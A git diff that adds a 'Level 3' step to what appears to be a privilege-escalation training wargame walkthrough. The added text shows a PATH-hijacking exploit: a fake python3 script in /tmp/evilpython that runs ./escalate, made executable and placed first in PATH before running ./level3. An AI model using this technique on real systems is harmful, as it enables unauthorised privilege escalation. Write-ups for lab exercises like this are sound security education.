@@ -83,5 +83,23 @@ Now execute `escalate` and your priveleges are fixed.
 Permanently added students24 to group level2, congratulations!
 /!\ Remember to log in again to reload your groups. /!\
 
+# Level 3
+Looking at the python code, there are no clear vulnerabilities. However, the system command that is run executes python3, what python3 executable this is, we do not know. So, we can determine that ourselves
 
-
+## Step 1
+Create a new python file
+`mkdir /tmp/evilpython/`
+## Step 2
+Write a script 
+`vim /tmp/evilpython/python3`
+and write the following:
+```
+#!/bin/bash
+./escalate
+```
+## Step 3: execute
+Set the script to allow execution:
+`chmod +x /tmp/evilpython/python3`
+Then proceed to execute with new path variable
+`PATH=/tmp/evilpython:$PATH ./level3`
+Win (execute `escalate`).
